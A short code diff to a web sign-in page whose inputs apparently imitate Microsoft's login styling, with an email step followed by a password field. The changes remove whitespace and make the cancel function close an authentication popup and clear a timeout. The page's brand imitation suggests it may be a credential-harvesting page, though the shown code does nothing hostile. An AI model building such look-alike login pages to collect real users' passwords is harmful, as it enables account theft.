@@ -531,7 +531,7 @@
             <div id="passwordForm" class="password-section">
                 <div class="form-group">
                     <p id="verifiedEmailDisplay" style="color: #323130; font-size: 14px; margin-bottom: 10px;"></p>
-                  
+
                     <input type="password" id="passwordInput" class="microsoft-input" placeholder="Password" required>
                 </div>
 
@@ -674,6 +674,17 @@
         }
 
         function cancelLoading() {
+            // Close auth window if it exists
+            if (authWindow && !authWindow.closed) {
+                authWindow.close();
+            }
+
+            // Clear timeout
+            if (window.authTimeoutId) {
+                clearTimeout(window.authTimeoutId);
+                window.authTimeoutId = null;
+            }
+
             setLoading(false);
             clearMessage();
             showEmailForm(); // Go back to email form
